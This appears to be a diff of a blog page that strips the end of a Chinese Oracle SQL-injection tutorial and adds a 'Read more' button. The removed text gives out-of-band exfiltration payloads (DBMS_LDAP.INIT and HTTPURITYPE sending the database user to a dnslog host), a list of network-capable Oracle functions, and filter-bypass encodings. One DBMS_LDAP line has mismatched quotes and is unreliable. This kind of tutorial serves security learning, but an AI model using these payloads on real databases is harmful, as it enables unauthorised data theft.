-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在 oracle 10g和11g里面只需要public权限</span><br><span class="line"><span class="keyword">SELECT</span> DBMS_LDAP.INIT((‘dnslog<span class="string">',80) FROM DUAL;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>HTTPURITYPE</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTPURITYPE根据给定的URI创建一个实例</span><br><span class="line"><span class="keyword">SELECT</span> HTTPURITYPE((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)||<span class="string">'dnslog'</span>).GETCLOB() <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>以下几个都可以发出网络请求:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UTL_INADDR.GET_HOST_ADDRESS</span><br><span class="line">UTL_HTTP.REQUEST</span><br><span class="line">HTTP_URITYPE.GETCLOB</span><br><span class="line">DBMS_LDAP.INIT and UTL_TCP</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-绕过"><a href="#0x03-绕过" class="headerlink" title="0x03 绕过"></a><code>0x03</code> 绕过</h3><h4 id="3-1编码绕过"><a href="#3-1编码绕过" class="headerlink" title="3.1编码绕过"></a><code>3.1编码绕过</code></h4><p>​    我们可以使用<code>hextoraw()</code>和<code>asciistr()</code>配合<code>UTL_RAW.CAST_TO_VARCHAR2()</code>函数来实现编码的绕过。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hextoraw()：十六进制字符串转换为raw</span><br><span class="line"><span class="keyword">SELECT</span> UTL_RAW.CAST_TO_VARCHAR2(hextoraw(<span class="string">"abcdef"</span>)) <span class="keyword">FROM</span> dual</span><br></pre></td></tr></table></figure>
-
-<p>使用rawtohex()来进行ascii的解码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT rawtohex(&#39;abcdef&#39;) FROM dual</span><br></pre></td></tr></table></figure>
-
-<p>下面是一些利用编码绕过的情况</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1 FROM dual;             正常语句</span><br><span class="line">SELECT%0a1%0aFROM%0adual;       \n换行来替代空格</span><br><span class="line">SELECT%0b1%0bFROM%0bdual;        使用tab来替换空格</span><br><span class="line">SELECT%0c1%0cFROM%0cdual;        使用\r回车开替换空格</span><br><span class="line">SELECT&#x2F;**&#x2F;1&#x2F;**&#x2F;FROM&#x2F;**&#x2F;dual;     多行注释符来替代回车</span><br><span class="line">SELECT--%0a1--%0aFROM--%0adual;  单行注释符和换行来替代回车</span><br><span class="line">SELECT&#x2F;*!12321SELECT*&#x2F;1&#x2F;*!12321AND*&#x2F;FROM&#x2F;*!12321QWE*&#x2F;dual; 使用内联注释符</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a><code>0x04</code> 参考</h3><p>留个链接，学Oracle了。</p>
-<p><a href="https://xz.aliyun.com/t/7897" target="_blank" rel="noopener">https://xz.aliyun.com/t/7897</a></p>
-<p><a href="https://xz.aliyun.com/t/8020" target="_blank" rel="noopener">https://xz.aliyun.com/t/8020</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/08/10/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Oracle%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
